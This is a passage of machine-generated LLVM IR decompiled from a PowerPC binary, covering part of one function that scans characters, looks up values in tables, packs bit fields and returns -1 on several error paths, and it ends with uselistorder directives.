  store i32 %v3_10006348, i32* %r0.global-to-local, align 4
  %v4_1000634c = icmp eq i8 %v2_10006340, %v2_10006348
  br i1 %v4_1000634c, label %dec_label_pc_10006118, label %dec_label_pc_10006354

dec_label_pc_10006354:                            ; preds = %dec_label_pc_10006348
  %v1_10006354 = add i32 %v0_10006354, 1
  %v2_10006354 = inttoptr i32 %v1_10006354 to i8*
  %v3_10006354 = load i8, i8* %v2_10006354, align 1
  %v4_10006354 = zext i8 %v3_10006354 to i32
  store i32 %v4_10006354, i32* %r0.global-to-local, align 4
  store i32 %v1_10006354, i32* %r11.global-to-local, align 4
  %v3_10006358 = icmp eq i8 %v3_10006354, 0
  br i1 %v3_10006358, label %dec_label_pc_10006360, label %dec_label_pc_10006348

dec_label_pc_10006360:                            ; preds = %dec_label_pc_10006354, %dec_label_pc_10006118
  %v0_10006388 = phi i32 [ %v1_10006118, %dec_label_pc_10006118 ], [ %v0_10006318, %dec_label_pc_10006354 ]
  %v0_10006384 = phi i32 [ %v0_10006354, %dec_label_pc_10006118 ], [ %v1_10006354, %dec_label_pc_10006354 ]
  %v2_10006368 = sub i32 %v0_10006384, ptrtoint ([9 x i8]* @global_var_1000e078.233 to i32)
  store i32 %v2_10006368, i32* %r9.global-to-local, align 4
  %v2_1000636c = icmp sgt i32 %v2_10006368, 1
  br i1 %v2_1000636c, label %dec_label_pc_1000638c, label %dec_label_pc_10006374

dec_label_pc_10006374:                            ; preds = %dec_label_pc_10006360
  %v1_10006374 = inttoptr i32 %v0_10006388 to i8*
  %v2_10006374 = load i8, i8* %v1_10006374, align 1
  %v3_10006374 = zext i8 %v2_10006374 to i32
  store i32 %v3_10006374, i32* %r0.global-to-local, align 4
  %v1_10006378 = inttoptr i32 %v0_10006384 to i8*
  %v2_10006378 = load i8, i8* %v1_10006378, align 1
  %v3_10006378 = zext i8 %v2_10006378 to i32
  store i32 %v3_10006378, i32* %r9.global-to-local, align 4
  %v4_1000637c = icmp eq i8 %v2_10006374, %v2_10006378
  br i1 %v4_1000637c, label %dec_label_pc_10006384, label %dec_label_pc_1000638c

dec_label_pc_10006384:                            ; preds = %dec_label_pc_10006374
  %v1_10006384 = add i32 %v0_10006384, 9
  store i32 %v1_10006384, i32* %r11.global-to-local, align 4
  %v1_10006388 = add i32 %v0_10006388, 1
  store i32 %v1_10006388, i32* @r30, align 4
  br label %dec_label_pc_1000638c

dec_label_pc_1000638c:                            ; preds = %dec_label_pc_10006374, %dec_label_pc_10006360, %dec_label_pc_10006384
  %v0_10006390 = phi i32 [ %v0_10006384, %dec_label_pc_10006374 ], [ %v0_10006384, %dec_label_pc_10006360 ], [ %v1_10006384, %dec_label_pc_10006384 ]
  %v0_1000638c = phi i32 [ %v0_10006388, %dec_label_pc_10006374 ], [ %v0_10006388, %dec_label_pc_10006360 ], [ %v1_10006388, %dec_label_pc_10006384 ]
  %v1_1000638c = inttoptr i32 %v0_1000638c to i8*
  %v2_1000638c = load i8, i8* %v1_1000638c, align 1
  %v3_1000638c = zext i8 %v2_1000638c to i32
  store i32 %v3_1000638c, i32* %r7.global-to-local, align 4
  %v1_10006390 = add i32 %v0_10006390, 9
  %v2_10006390 = inttoptr i32 %v1_10006390 to i8*
  %v3_10006390 = load i8, i8* %v2_10006390, align 1
  %v4_10006390 = zext i8 %v3_10006390 to i32
  store i32 %v4_10006390, i32* %r0.global-to-local, align 4
  %v3_10006394 = icmp eq i8 %v2_1000638c, 0
  %v1_10006398 = mul nuw nsw i32 %v4_10006390, 256
  store i32 %v1_10006398, i32* %r10.global-to-local, align 4
  br i1 %v3_10006394, label %dec_label_pc_100065d0, label %dec_label_pc_100063a0

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_1000638c
  %v1_100063a4 = and i32 %v1_10006398, 1024
  store i32 %v1_100063a4, i32* %r0.global-to-local, align 4
  %v3_100063a4 = icmp eq i32 %v1_100063a4, 0
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  %v3_100063b0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_100063b0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e0ac.235 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100063c0

dec_label_pc_100063c0:                            ; preds = %dec_label_pc_10006424, %dec_label_pc_100063a0
  %v1_100063cc = phi i32 [ %v1_10006424, %dec_label_pc_10006424 ], [ ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32), %dec_label_pc_100063a0 ]
  %v1_100063c0 = inttoptr i32 %v1_100063cc to i8*
  %v2_100063c0 = load i8, i8* %v1_100063c0, align 1
  %v3_100063c0 = zext i8 %v2_100063c0 to i32
  store i32 %v3_100063c0, i32* %r0.global-to-local, align 4
  %v4_100063c4 = icmp eq i8 %v2_100063c0, %v2_1000638c
  br i1 %v4_100063c4, label %dec_label_pc_100063cc, label %dec_label_pc_10006424

dec_label_pc_100063cc:                            ; preds = %dec_label_pc_100063c0
  %v2_100063cc = sub i32 %v1_100063cc, ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32)
  %tmp61 = icmp slt i32 %v2_100063cc, 18
  %brmerge = or i1 %v3_100063a4, %tmp61
  br i1 %brmerge, label %dec_label_pc_100063e0, label %dec_label_pc_100063dc

dec_label_pc_100063dc:                            ; preds = %dec_label_pc_100063cc
  %v1_100063dc = add i32 %v2_100063cc, -2
  br label %dec_label_pc_100063e0

dec_label_pc_100063e0:                            ; preds = %dec_label_pc_100063cc, %dec_label_pc_100063dc
  %storemerge = phi i32 [ %v1_100063dc, %dec_label_pc_100063dc ], [ %v2_100063cc, %dec_label_pc_100063cc ]
  %v0_100063e0 = phi i32 [ %v1_100063dc, %dec_label_pc_100063dc ], [ %v2_100063cc, %dec_label_pc_100063cc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100063e0 = load i32, i32* @r28, align 4
  %v2_100063e0 = add i32 %v1_100063e0, 32
  %v3_100063e0 = inttoptr i32 %v2_100063e0 to i32*
  store i32 %v0_100063e0, i32* %v3_100063e0, align 4
  store i32 ptrtoint (i32* @global_var_1000e0ab.236 to i32), i32* %r11.global-to-local, align 4
  %v0_100063ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100063e8

dec_label_pc_100063e8:                            ; preds = %dec_label_pc_100063e8, %dec_label_pc_100063e0
  %v0_100063e8 = phi i32 [ %v1_100063e8, %dec_label_pc_100063e8 ], [ ptrtoint (i32* @global_var_1000e0ab.236 to i32), %dec_label_pc_100063e0 ]
  %v1_100063e8 = add i32 %v0_100063e8, 1
  %v2_100063e8 = inttoptr i32 %v1_100063e8 to i8*
  %v3_100063e8 = load i8, i8* %v2_100063e8, align 1
  %v4_100063e8 = zext i8 %v3_100063e8 to i32
  store i32 %v4_100063e8, i32* %r0.global-to-local, align 4
  store i32 %v1_100063e8, i32* %r11.global-to-local, align 4
  %v3_100063ec = icmp sgt i32 %v0_100063ec.pre, %v4_100063e8
  br i1 %v3_100063ec, label %dec_label_pc_100063e8, label %dec_label_pc_100063f4

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_100063e8
  %v0_100063f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100063f4 = sub i32 %v1_100063e8, %v0_100063f4
  %v1_100063fc = mul i32 %v2_100063f4, 2
  store i32 %v1_100063fc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e09c.237 to i32), i32* %r9.global-to-local, align 4
  %v2_10006404 = add i32 %v1_100063fc, ptrtoint (i32* @global_var_1000e09c.237 to i32)
  %v3_10006404 = inttoptr i32 %v2_10006404 to i16*
  %v4_10006404 = load i16, i16* %v3_10006404, align 2
  %v5_10006404 = sext i16 %v4_10006404 to i32
  store i32 %v5_10006404, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e08c.238 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0b8.234 to i32), i32* %r8.global-to-local, align 4
  %v2_10006414 = add i32 %v1_100063fc, ptrtoint (i32* @global_var_1000e08c.238 to i32)
  %v3_10006414 = inttoptr i32 %v2_10006414 to i16*
  %v4_10006414 = load i16, i16* %v3_10006414, align 2
  %v5_10006414 = sext i16 %v4_10006414 to i32
  store i32 %v5_10006414, i32* %r9.global-to-local, align 4
  %v2_10006418 = or i32 %v5_10006404, %v1_10006398
  store i32 %v2_10006418, i32* %r0.global-to-local, align 4
  %v2_1000641c = and i32 %v5_10006414, %v2_10006418
  store i32 %v2_1000641c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006430

dec_label_pc_10006424:                            ; preds = %dec_label_pc_100063c0
  %v1_10006424 = add i32 %v1_100063cc, 1
  %v2_10006424 = inttoptr i32 %v1_10006424 to i8*
  %v3_10006424 = load i8, i8* %v2_10006424, align 1
  %v4_10006424 = zext i8 %v3_10006424 to i32
  store i32 %v4_10006424, i32* %r0.global-to-local, align 4
  store i32 %v1_10006424, i32* %r8.global-to-local, align 4
  %v3_10006428 = icmp eq i8 %v3_10006424, 0
  br i1 %v3_10006428, label %dec_label_pc_10006430, label %dec_label_pc_100063c0

dec_label_pc_10006430:                            ; preds = %dec_label_pc_10006424, %dec_label_pc_100063f4
  %v0_10006430 = phi i32 [ %v2_1000641c, %dec_label_pc_100063f4 ], [ %v3_100063b0, %dec_label_pc_10006424 ]
  store i32 %v0_10006430, i32* %stack_var_-96, align 4
  %v0_10006434 = load i32, i32* %r6.global-to-local, align 4
  %v1_10006434 = call i32 @__asm_rlwinm(i32 %v0_10006434, i32 30, i32 31, i32 31)
  %not.v2_10006438 = icmp eq i32 %v1_10006434, 0
  %v6_1000643c = sext i1 %not.v2_10006438 to i32
  store i32 %v6_1000643c, i32* %r9.global-to-local, align 4
  %v1_10006440 = call i32 @__asm_rlwinm(i32 %v1_10006398, i32 0, i32 20, i32 23)
  store i32 %v1_10006440, i32* %r0.global-to-local, align 4
  %v1_10006444 = call i32 @__asm_rlwinm(i32 %v6_1000643c, i32 0, i32 0, i32 27)
  store i32 %v1_10006444, i32* %r9.global-to-local, align 4
  %v0_10006448 = load i32, i32* @r30, align 4
  %v1_10006448 = inttoptr i32 %v0_10006448 to i8*
  %v2_10006448 = load i8, i8* %v1_10006448, align 1
  %v3_10006448 = zext i8 %v2_10006448 to i32
  store i32 %v3_10006448, i32* %r10.global-to-local, align 4
  %v0_1000644c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000644c = call i32 @__asm_rlwinm(i32 %v0_1000644c, i32 0, i32 30, i32 28)
  %v1_10006450 = add i32 %v1_10006444, 48
  store i32 %v1_10006450, i32* %r9.global-to-local, align 4
  %v2_10006454 = or i32 %v1_1000644c, %v1_10006440
  store i32 %v2_10006454, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1000645c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000645c = load i32, i32* @r28, align 4
  %v2_1000645c = add i32 %v1_1000645c, 12
  %v3_1000645c = inttoptr i32 %v2_1000645c to i32*
  store i32 %v0_1000645c, i32* %v3_1000645c, align 4
  %v0_10006460 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006460 = load i32, i32* @r28, align 4
  %v2_10006460 = add i32 %v1_10006460, 4
  %v3_10006460 = inttoptr i32 %v2_10006460 to i32*
  store i32 %v0_10006460, i32* %v3_10006460, align 4
  %v0_10006464 = load i32, i32* @r31, align 4
  %v1_10006464 = load i32, i32* @r28, align 4
  %v2_10006464 = add i32 %v1_10006464, 8
  %v3_10006464 = inttoptr i32 %v2_10006464 to i32*
  store i32 %v0_10006464, i32* %v3_10006464, align 4
  %v0_10006468 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006468 = load i32, i32* @r28, align 4
  %v2_10006468 = add i32 %v1_10006468, 20
  %v3_10006468 = inttoptr i32 %v2_10006468 to i32*
  store i32 %v0_10006468, i32* %v3_10006468, align 4
  %v0_1000646c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000646c = load i32, i32* @r28, align 4
  %v2_1000646c = add i32 %v1_1000646c, 16
  %v3_1000646c = inttoptr i32 %v2_1000646c to i32*
  store i32 %v0_1000646c, i32* %v3_1000646c, align 4
  %v0_10006470 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006470 = load i32, i32* @r28, align 4
  %v2_10006470 = add i32 %v1_10006470, 28
  %v3_10006470 = inttoptr i32 %v2_10006470 to i32*
  store i32 %v0_10006470, i32* %v3_10006470, align 4
  %v0_10006474 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006474 = inttoptr i32 %v0_10006474 to i8*
  %v2_10006474 = load i8, i8* %v1_10006474, align 1
  %v3_10006474 = zext i8 %v2_10006474 to i32
  store i32 %v3_10006474, i32* %r9.global-to-local, align 4
  %v3_10006478 = icmp eq i8 %v2_10006474, 0
  br i1 %v3_10006478, label %dec_label_pc_10006480, label %dec_label_pc_10006498

dec_label_pc_10006480:                            ; preds = %dec_label_pc_10006430
  %v0_10006480 = load i32, i32* @r30, align 4
  %v1_10006480 = inttoptr i32 %v0_10006480 to i8*
  %v2_10006480 = load i8, i8* %v1_10006480, align 1
  %v3_10006480 = zext i8 %v2_10006480 to i32
  store i32 %v3_10006480, i32* %r0.global-to-local, align 4
  %v3_10006484 = icmp eq i8 %v2_10006480, 109
  br i1 %v3_10006484, label %dec_label_pc_1000648c, label %dec_label_pc_100065d0

dec_label_pc_1000648c:                            ; preds = %dec_label_pc_10006480
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10006490 = load i32, i32* @r28, align 4
  %v2_10006490 = add i32 %v1_10006490, 28
  %v3_10006490 = inttoptr i32 %v2_10006490 to i32*
  store i32 %v3_10006474, i32* %v3_10006490, align 4
  %v0_10006494 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006494 = load i32, i32* @r28, align 4
  %v2_10006494 = add i32 %v1_10006494, 32
  %v3_10006494 = inttoptr i32 %v2_10006494 to i32*
  store i32 %v0_10006494, i32* %v3_10006494, align 4
  br label %dec_label_pc_10006498

dec_label_pc_10006498:                            ; preds = %dec_label_pc_10006430, %dec_label_pc_1000648c
  %v0_10006498 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10006498, 1
  br i1 %tmp62, label %dec_label_pc_10006574, label %dec_label_pc_100064a0

dec_label_pc_100064a0:                            ; preds = %dec_label_pc_10006498
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100064a4

dec_label_pc_100064a4:                            ; preds = %dec_label_pc_1000655c, %dec_label_pc_100064a0
  %v0_100064cc = phi i32 [ 0, %dec_label_pc_100064a0 ], [ %v1_10006560, %dec_label_pc_1000655c ]
  %v2_100064a4 = icmp sgt i32 %v0_100064cc, 2
  br i1 %v2_100064a4, label %dec_label_pc_100064c8, label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_100064a4
  %v1_100064ac = mul i32 %v0_100064cc, 4
  store i32 %v1_100064ac, i32* %r0.global-to-local, align 4
  %v0_100064b0 = load i32, i32* @r1, align 4
  %v2_100064b0 = add i32 %v0_100064b0, %v1_100064ac
  store i32 %v2_100064b0, i32* %r9.global-to-local, align 4
  %v1_100064b4 = add i32 %v2_100064b0, 20
  %v2_100064b4 = inttoptr i32 %v1_100064b4 to i32*
  %v3_100064b4 = load i32, i32* %v2_100064b4, align 4
  store i32 %v3_100064b4, i32* %r0.global-to-local, align 4
  %v1_100064b8 = load i32, i32* @r28, align 4
  %v2_100064b8 = add i32 %v1_100064b8, %v0_100064cc
  store i32 %v2_100064b8, i32* %r9.global-to-local, align 4
  %v1_100064bc = urem i32 %v3_100064b4, 256
  store i32 %v1_100064bc, i32* %r11.global-to-local, align 4
  %v1_100064c0 = trunc i32 %v3_100064b4 to i8
  %v3_100064c0 = add i32 %v2_100064b8, 36
  %v4_100064c0 = inttoptr i32 %v3_100064c0 to i8*
  store i8 %v1_100064c0, i8* %v4_100064c0, align 1
  %v0_100064d4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100064d4

dec_label_pc_100064c8:                            ; preds = %dec_label_pc_100064a4
  %v2_100064cc = add i32 %v0_100064cc, %stack_var_-84.3
  store i32 %v2_100064cc, i32* %r9.global-to-local, align 4
  %v1_100064d0 = add i32 %v2_100064cc, -2
  store i32 %v1_100064d0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100064d4

dec_label_pc_100064d4:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_100064c8
  %v0_100064f4 = phi i32 [ %v0_100064d4.pre, %dec_label_pc_100064ac ], [ %v1_100064d0, %dec_label_pc_100064c8 ]
  %v1_100064d4 = load i32, i32* @r26, align 4
  %v3_100064d4 = icmp sgt i32 %v0_100064f4, %v1_100064d4
  br i1 %v3_100064d4, label %dec_label_pc_100064dc, label %dec_label_pc_100064e8

dec_label_pc_100064dc:                            ; preds = %dec_label_pc_100064d4
  %v2_100064dc = icmp sgt i32 %v0_100064f4, 9
  br i1 %v2_100064dc, label %dec_label_pc_100065d0, label %dec_label_pc_100064e4

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_100064dc
  store i32 %v0_100064f4, i32* @r26, align 4
  br label %dec_label_pc_100064e8

dec_label_pc_100064e8:                            ; preds = %dec_label_pc_100064d4, %dec_label_pc_100064e4
  store i32 %v2_10006184.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100064ec = load i32, i32* @r27, align 4
  %v1_100064ec = mul i32 %v0_100064ec, 4
  store i32 %v1_100064ec, i32* %r0.global-to-local, align 4
  %v2_100064f0 = add i32 %v1_100064ec, %v2_10006184.pre-phi
  %v3_100064f0 = inttoptr i32 %v2_100064f0 to i32*
  %v4_100064f0 = load i32, i32* %v3_100064f0, align 4
  store i32 %v4_100064f0, i32* @r31, align 4
  %v1_100064f4 = add i32 %v0_100064f4, -1
  store i32 %v1_100064f4, i32* @r25, align 4
  %v1_100064f8 = mul i32 %v1_100064f4, 4
  %v3_100064fc = icmp eq i32 %v4_100064f0, 8
  %v1_10006500 = load i32, i32* @r28, align 4
  %v2_10006500 = add i32 %v1_10006500, %v1_100064f8
  store i32 %v2_10006500, i32* %r9.global-to-local, align 4
  %v1_10006504 = add i32 %v2_10006500, 40
  %v2_10006504 = inttoptr i32 %v1_10006504 to i32*
  %v3_10006504 = load i32, i32* %v2_10006504, align 4
  store i32 %v3_10006504, i32* %r3.global-to-local, align 4
  br i1 %v3_100064fc, label %dec_label_pc_1000655c, label %dec_label_pc_1000650c

dec_label_pc_1000650c:                            ; preds = %dec_label_pc_100064e8
  %v3_1000650c = icmp eq i32 %v3_10006504, 8
  br i1 %v3_1000650c, label %dec_label_pc_10006544, label %dec_label_pc_10006514

dec_label_pc_10006514:                            ; preds = %dec_label_pc_1000650c
  %v4_10006514 = icmp eq i32 %v3_10006504, %v4_100064f0
  br i1 %v4_10006514, label %dec_label_pc_10006544, label %dec_label_pc_1000651c

dec_label_pc_1000651c:                            ; preds = %dec_label_pc_10006514
  %v1_1000651c = call i32 @function_1000608c(i32 %v3_10006504)
  store i32 %v1_1000651c, i32* @r29, align 4
  %v0_10006524 = load i32, i32* @r31, align 4
  store i32 %v0_10006524, i32* %r3.global-to-local, align 4
  %v1_10006528 = call i32 @function_1000608c(i32 %v0_10006524)
  store i32 %v1_10006528, i32* %r3.global-to-local, align 4
  %v0_10006534 = call i32 @__asm_mfcr()
  store i32 %v0_10006534, i32* %r3.global-to-local, align 4
  store i32 %v0_10006534, i32* %r0.global-to-local, align 4
  %v1_10006538 = call i32 @__asm_rlwinm(i32 %v0_10006534, i32 31, i32 31, i32 31)
  store i32 %v1_10006538, i32* %r0.global-to-local, align 4
  %v3_1000653c = icmp eq i32 %v1_10006538, 0
  br i1 %v3_1000653c, label %dec_label_pc_1000655c, label %dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge

dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge: ; preds = %dec_label_pc_1000651c
  %v0_10006548.pre = load i32, i32* @r27, align 4
  %v0_10006550.pre = load i32, i32* @r25, align 4
  %v1_10006554.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006544

dec_label_pc_10006544:                            ; preds = %dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge, %dec_label_pc_10006514, %dec_label_pc_1000650c
  %v1_10006554 = phi i32 [ %v1_10006554.pre, %dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge ], [ %v1_10006500, %dec_label_pc_10006514 ], [ %v1_10006500, %dec_label_pc_1000650c ]
  %v0_10006550 = phi i32 [ %v0_10006550.pre, %dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge ], [ %v1_100064f4, %dec_label_pc_10006514 ], [ %v1_100064f4, %dec_label_pc_1000650c ]
  %v0_10006548 = phi i32 [ %v0_10006548.pre, %dec_label_pc_1000651c.dec_label_pc_10006544_crit_edge ], [ %v0_100064ec, %dec_label_pc_10006514 ], [ %v0_100064ec, %dec_label_pc_1000650c ]
  store i32 %v2_10006184.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10006548 = mul i32 %v0_10006548, 4
  store i32 %v1_10006548, i32* %r0.global-to-local, align 4
  %v2_1000654c = add i32 %v1_10006548, %v2_10006184.pre-phi
  %v3_1000654c = inttoptr i32 %v2_1000654c to i32*
  %v4_1000654c = load i32, i32* %v3_1000654c, align 4
  store i32 %v4_1000654c, i32* %r0.global-to-local, align 4
  %v1_10006550 = mul i32 %v0_10006550, 4
  %v2_10006554 = add i32 %v1_10006550, %v1_10006554
  store i32 %v2_10006554, i32* %r9.global-to-local, align 4
  %v2_10006558 = add i32 %v2_10006554, 40
  %v3_10006558 = inttoptr i32 %v2_10006558 to i32*
  store i32 %v4_1000654c, i32* %v3_10006558, align 4
  br label %dec_label_pc_1000655c

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_1000651c, %dec_label_pc_100064e8, %dec_label_pc_10006544
  %v0_1000655c = load i32, i32* @r28, align 4
  %v1_1000655c = add i32 %v0_1000655c, 28
  %v2_1000655c = inttoptr i32 %v1_1000655c to i32*
  %v3_1000655c = load i32, i32* %v2_1000655c, align 4
  %v0_10006560 = load i32, i32* @r27, align 4
  %v1_10006560 = add i32 %v0_10006560, 1
  store i32 %v1_10006560, i32* @r27, align 4
  %v1_10006564 = add i32 %v3_1000655c, 2
  store i32 %v1_10006564, i32* %r9.global-to-local, align 4
  %v2_10006568 = icmp slt i32 %v1_10006560, %v1_10006564
  br i1 %v2_10006568, label %dec_label_pc_100064a4, label %dec_label_pc_1000658c

dec_label_pc_10006574:                            ; preds = %dec_label_pc_10006498
  %v0_10006574 = load i32, i32* @r28, align 4
  %v1_10006574 = add i32 %v0_10006574, 28
  %v2_10006574 = inttoptr i32 %v1_10006574 to i32*
  %v3_10006574 = load i32, i32* %v2_10006574, align 4
  store i32 %v3_10006574, i32* %r5.global-to-local, align 4
  %v1_10006578 = add i32 %v0_10006574, 40
  store i32 %v1_10006578, i32* @r3, align 4
  %v0_1000657c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000657c = trunc i32 %v0_1000657c to i8
  %v3_1000657c = add i32 %v0_10006574, 38
  %v4_1000657c = inttoptr i32 %v3_1000657c to i8*
  store i8 %v1_1000657c, i8* %v4_1000657c, align 1
  %v2_10006580 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10006580, i32* @r4, align 4
  %v0_10006584 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006584 = mul i32 %v0_10006584, 4
  store i32 %v1_10006584, i32* @r5, align 4
  store i32 268461452, i32* @lr, align 4
  %v0_10006588 = call i32 @function_10006d8c()
  store i32 %v0_10006588, i32* %r3.global-to-local, align 4
  %v0_1000658c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000658c

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_1000655c, %dec_label_pc_10006574
  %v0_1000658c = phi i32 [ %v0_1000658c.pre, %dec_label_pc_10006574 ], [ %v0_1000655c, %dec_label_pc_1000655c ]
  %v1_1000658c = add i32 %v0_1000658c, 16
  %v2_1000658c = inttoptr i32 %v1_1000658c to i32*
  %v3_1000658c = load i32, i32* %v2_1000658c, align 4
  store i32 %v3_1000658c, i32* %r0.global-to-local, align 4
  %v0_10006590 = load i32, i32* @r26, align 4
  %v2_10006590 = add i32 %v0_1000658c, 24
  %v3_10006590 = inttoptr i32 %v2_10006590 to i32*
  store i32 %v0_10006590, i32* %v3_10006590, align 4
  %v0_10006594 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006594 = and i32 %v0_10006594, 128
  store i32 %v1_10006594, i32* %r9.global-to-local, align 4
  %v3_10006594 = icmp eq i32 %v1_10006594, 0
  br i1 %v3_10006594, label %dec_label_pc_1000659c, label %dec_label_pc_100065a8

dec_label_pc_1000659c:                            ; preds = %dec_label_pc_1000658c
  %v0_1000659c = load i32, i32* @r30, align 4
  %v1_1000659c = add i32 %v0_1000659c, 1
  store i32 %v1_1000659c, i32* %r0.global-to-local, align 4
  %v1_100065a0 = load i32, i32* @r28, align 4
  %v2_100065a0 = inttoptr i32 %v1_100065a0 to i32*
  store i32 %v1_1000659c, i32* %v2_100065a0, align 4
  br label %dec_label_pc_100065c0

dec_label_pc_100065a8:                            ; preds = %dec_label_pc_1000658c
  %v2_100065a8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_100065a8, i32* %r0.global-to-local, align 4
  %v0_100065ac = load i32, i32* @r28, align 4
  %v1_100065ac = inttoptr i32 %v0_100065ac to i32*
  %v2_100065ac = load i32, i32* %v1_100065ac, align 4
  %v1_100065b0 = load i32, i32* @r30, align 4
  %v2_100065b0 = sub i32 %v1_100065b0, %v2_100065a8
  %v1_100065b4 = mul i32 %v2_100065b0, 4
  store i32 %v1_100065b4, i32* %r0.global-to-local, align 4
  %v2_100065b8 = add i32 %v1_100065b4, %v2_100065ac
  store i32 %v2_100065b8, i32* %r9.global-to-local, align 4
  store i32 %v2_100065b8, i32* %v1_100065ac, align 4
  br label %dec_label_pc_100065c0

dec_label_pc_100065c0:                            ; preds = %dec_label_pc_1000659c, %dec_label_pc_100065a8
  %v0_100065c0 = load i32, i32* @r28, align 4
  %v1_100065c0 = add i32 %v0_100065c0, 28
  %v2_100065c0 = inttoptr i32 %v1_100065c0 to i32*
  %v3_100065c0 = load i32, i32* %v2_100065c0, align 4
  store i32 %v3_100065c0, i32* %r9.global-to-local, align 4
  %v1_100065c4 = add i32 %v3_100065c0, 2
  br label %dec_label_pc_100065d0

dec_label_pc_100065d0:                            ; preds = %dec_label_pc_10006134, %dec_label_pc_10006208, %dec_label_pc_100062e4, %dec_label_pc_100062d8, %dec_label_pc_10006300, %dec_label_pc_1000623c, %dec_label_pc_100064dc, %dec_label_pc_1000638c, %dec_label_pc_10006480, %dec_label_pc_100065c0
  %storemerge2 = phi i32 [ %v1_100065c4, %dec_label_pc_100065c0 ], [ -1, %dec_label_pc_10006480 ], [ -1, %dec_label_pc_1000638c ], [ -1, %dec_label_pc_100064dc ], [ -1, %dec_label_pc_1000623c ], [ -1, %dec_label_pc_10006300 ], [ -1, %dec_label_pc_100062d8 ], [ -1, %dec_label_pc_100062e4 ], [ -1, %dec_label_pc_10006208 ], [ -1, %dec_label_pc_10006134 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100060cc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100065b4, { 1, 0 }
  uselistorder i32 %v0_1000658c, { 1, 0 }
  uselistorder i32 %v1_10006560, { 1, 2, 0 }
  uselistorder i32 %v1_10006548, { 1, 0 }
  uselistorder i32 %v0_10006534, { 0, 2, 1 }
  uselistorder i32 %v3_10006504, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10006500, { 1, 2, 0 }
  uselistorder i32 %v1_100064f4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100064ec, { 1, 0 }
  uselistorder i32 %v0_100064ec, { 1, 2, 0 }
  uselistorder i32 %v3_100064b4, { 1, 0, 2 }
  uselistorder i32 %v1_100064ac, { 1, 0 }
  uselistorder i32 %v0_100064cc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10006424, { 1, 2, 0 }
  uselistorder i32 %v1_100063fc, { 2, 1, 0 }
  uselistorder i32 %v1_100063e8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100063cc, { 1, 0, 2 }
  uselistorder i32 %v1_10006398, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10006354, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10006318, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10006304, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10006274, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10006270, { 1, 0 }
  uselistorder i32 %v0_10006288, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100061ec, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100061e4, { 1, 0 }
  uselistorder i32 %v1_100061d4, { 1, 0 }
  uselistorder i32 %v3_100061cc, { 1, 0, 2 }
  uselistorder i32 %v0_10006248, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10006218, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_100061a8, { 0, 1, 3, 2 }
